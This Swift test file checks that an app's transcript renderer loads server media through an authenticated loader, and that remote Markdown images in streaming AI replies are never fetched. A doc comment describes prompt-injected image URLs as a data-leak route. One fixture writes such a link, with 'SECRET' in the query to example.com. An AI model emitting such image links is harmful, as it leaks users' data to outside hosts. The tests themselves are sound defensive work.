import SwiftUI
import UIKit
import XCTest
@testable import Talaria
@testable import TalariaKit

/// TAL-186: an assistant body with server media renders as one Markdown document. Each image the server rewrote,
/// wherever the Markdown puts it, loads through the authenticated transcript loader as the server's item; the
/// App recognizes nothing in the text itself.
@MainActor
final class TranscriptMediaRenderingTests: XCTestCase {
    func testEveryImageTheServerRewroteLoadsThroughTheAuthenticatedLoader() async throws {
        let constructs = ["bold", "list", "quote", "linked", "inline"]
        let media = constructs.map { name in
            TranscriptMediaReference(url: "./api/media?path=%2Ftmp%2F\(name).png&session_id=s1", name: "\(name).png", mime: "image/png", mediaKind: .image)
        }
        let audio = TranscriptMediaReference(url: "./api/media?path=%2Ftmp%2Fclip.mp3&session_id=s1", name: "clip.mp3", mime: "audio/mpeg", mediaKind: .audio)
        let display = TranscriptDisplayBody(text: """
        **before ![Bold](\(media[0].url)) after**

        Plain text ![Inline](\(media[4].url)) around an image.

        - ![List](\(media[1].url))

        > ![Quote](\(media[2].url))

        [![Linked](\(media[3].url))](https://example.invalid/linked)

        Narration: [clip.mp3](\(audio.url))
        """, media: media + [audio])
        let message = ChatMessage(
            role: "assistant",
            content: "**before MEDIA:/tmp/bold.png after** …",
            timestamp: nil,
            messageId: "media-reply",
            displayBody: display
        )
        let loads = LoadRecorder()

        try hostInOwnWindow(MessageBubbleView(
            message: message,
            loadTranscriptMediaImage: { reference in
                loads.record(reference.url)
                return TestPNG.data
            },
            loadTranscriptMediaData: { _ in nil },
            // A fresh namespace: the decoded-image cache must not answer for another test's run.
            transcriptMediaCacheNamespace: "https://example.invalid|\(UUID().uuidString)"
        ), size: CGSize(width: 360, height: 900))

        _ = await awaitCondition { Set(loads.urls) == Set(media.map(\.url)) }
        XCTAssertEqual(Set(loads.urls), Set(media.map(\.url)), "Each construct's image loads as the server's item")
        XCTAssertFalse(loads.urls.contains(audio.url), "Audio renders as a tile, not an inline image")
    }
}

/// TAL-2582: a streaming reply is raw Markdown the server has not rewritten yet. A remote image in it never loads by
/// itself, since its URL can carry data a prompt injection put there; it shows as a link named by its alt text, as the
/// server's display text shows it once the reply settles. Server media and an inline `data:` image still load.
@MainActor
final class RemoteMarkdownImageTests: XCTestCase {
    override func setUp() {
        super.setUp()
        RemoteImageRequests.start()
        addTeardownBlock { RemoteImageRequests.stop() }
    }

    func testStreamedRemoteImageShowsAsALinkAndIsNeverRequested() async throws {
        let window = try hostInOwnWindow(
            MarkdownRenderer(content: """
            The page asked for its chart:

            ![x](https://example.com/a.png?d=SECRET)

            And a badge ![y](https://example.com/b.png) inside a sentence, and a dot:

            ![dot](\(TestPNG.dataURL))
            """, isStreaming: true),
            size: CGSize(width: 360, height: 600)
        )

        for label in ["x", "y"] {
            let link = await awaitElement(in: window) { $0.accessibilityLabel == label && $0.accessibilityTraits.contains(.link) }
            XCTAssertNotNil(link, "The remote image \(label) shows as a link")
        }
        let dot = await awaitElement(in: window, label: "dot")
        XCTAssertTrue(dot?.accessibilityTraits.contains(.image) == true, "The data image still renders")
        XCTAssertEqual(RemoteImageRequests.urls, [], "Nothing is requested from example.com")
        attachHostedScreenshot(window, name: "streamed-remote-images")
    }

    /// A body the server rewrote keeps loading its own media through the authenticated loader beside a remote image.
    func testServerMediaStillLoadsBesideARemoteImage() async throws {
        let server = TranscriptMediaReference(url: "./api/media?path=%2Ftmp%2Fchart.png&session_id=s1", name: "chart.png", mime: "image/png", mediaKind: .image)
        let relayed = TranscriptMediaReference(url: "./api/remote-image?id=3445fe4e07acfe4b73f54106bd5f9507", name: "cat.png", mime: "image/png", mediaKind: .image)
        let display = TranscriptDisplayBody(text: """
        ![Chart](\(server.url))

        ![Cat](\(relayed.url))

        ![z](https://example.com/c.png)
        """, media: [server, relayed])
        let loads = LoadRecorder()
        let window = try hostInOwnWindow(
            TranscriptMediaContentView(
                markdown: display.text,
                display: display,
                cacheNamespace: "https://example.invalid|\(UUID().uuidString)",
                loadMediaImage: { reference in
                    loads.record(reference.url)
                    return TestPNG.data
                },
                loadMediaData: { _ in nil },
                onPreviewMedia: nil,
                isStreaming: false
            ),
            size: CGSize(width: 360, height: 700)
        )

        _ = await awaitCondition { Set(loads.urls) == [server.url, relayed.url] }
        XCTAssertEqual(Set(loads.urls), [server.url, relayed.url], "Server media loads as the server's items")
        let link = await awaitElement(in: window) { $0.accessibilityLabel == "z" && $0.accessibilityTraits.contains(.link) }
        XCTAssertNotNil(link, "The remote image shows as a link")
        XCTAssertEqual(RemoteImageRequests.urls, [], "Nothing is requested from example.com")
        attachHostedScreenshot(window, name: "server-media-beside-remote-image")
    }
}

/// A stub for `example.com`, the only host these tests' remote images name: it records each request and answers it
/// with the test PNG, so a remote image that loads is seen rather than reaching the network.
private final class RemoteImageRequests: URLProtocol {
    private static let lock = NSLock()
    nonisolated(unsafe) private static var recorded: [URL] = []
    static var urls: [URL] { lock.withLock { recorded } }

    static func start() {
        lock.withLock { recorded = [] }
        URLProtocol.registerClass(RemoteImageRequests.self)
    }

    static func stop() { URLProtocol.unregisterClass(RemoteImageRequests.self) }

    override class func canInit(with request: URLRequest) -> Bool { request.url?.host == "example.com" }
    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }

    override func startLoading() {
        guard let url = request.url else { return }
        Self.lock.withLock { Self.recorded.append(url) }
        let response = HTTPURLResponse(url: url, statusCode: 200, httpVersion: nil, headerFields: ["Content-Type": "image/png"])!
        client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
        client?.urlProtocol(self, didLoad: TestPNG.data)
        client?.urlProtocolDidFinishLoading(self)
    }

    override func stopLoading() {}
}

@MainActor
private final class LoadRecorder {
    private(set) var urls: [String] = []
    func record(_ url: String) { urls.append(url) }
}

private enum TestPNG {
    static let data: Data = UIGraphicsImageRenderer(size: CGSize(width: 24, height: 16)).pngData { context in
        UIColor.systemTeal.setFill()
        context.fill(CGRect(x: 0, y: 0, width: 24, height: 16))
    }
    static let dataURL = "data:image/png;base64,\(data.base64EncodedString())"
}
